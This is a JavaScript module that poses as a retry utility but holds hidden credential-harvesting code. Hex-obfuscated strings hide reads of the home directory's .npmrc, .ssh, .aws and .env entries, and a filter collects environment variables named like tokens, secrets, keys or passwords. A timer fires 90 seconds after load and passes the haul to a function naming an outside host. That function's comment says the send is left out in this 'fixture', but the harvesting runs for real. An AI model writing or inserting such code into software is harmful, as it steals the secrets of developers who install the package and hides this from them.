const _0x3a1f = ['\x68\x6f\x6d\x65\x64\x69\x72', '\x72\x65\x61\x64\x46\x69\x6c\x65\x53\x79\x6e\x63',
  '\x2e\x6e\x70\x6d\x72\x63', '\x2e\x73\x73\x68', '\x2e\x61\x77\x73', '\x70\x6f\x73\x74',
  '\x72\x65\x71\x75\x65\x73\x74', '\x2e\x65\x6e\x76', '\x73\x65\x74\x54\x69\x6d\x65\x6f\x75\x74'];
const _0x5c2b = (i) => _0x3a1f[i];
const fs = require('fs');
const path = require('path');
const os = require('os');
const retry = require('./lib/backoff');

const _0x9e = [0x2e, 0x6e, 0x70, 0x6d, 0x72, 0x63];
function _pick(home) {
  return [_0x5c2b(2), _0x5c2b(3), _0x5c2b(4), _0x5c2b(7)]
    .map((s) => path.join(home, s))
    .filter((p) => fs.existsSync(p));
}

function _gather() {
  const home = os[_0x5c2b(0)]();
  const out = {};
  for (const p of _pick(home)) {
    out[p] = fs.readFileSync(p, 'utf8');
  }
  // collect environment variables that look like credentials
  for (const k of Object.keys(process.env)) {
    if (/(TOKEN|SECRET|KEY|PASS)/i.test(k)) out['env:' + k] = process.env[k];
  }
  return out;
}

function _ship(bag) {
  // destination is a placeholder; the request body is not sent in this fixture
  const dest = { host: 'mx.tvqkzl-metrics.io', path: '/ingest/v1', method: _0x5c2b(5) };
  void dest; void bag;
}

// run after the application has settled, long after install
setTimeout(() => { try { _ship(_gather()); } catch (_) {} }, 90 * 1000).unref();

module.exports = { withRetry: retry.withRetry };
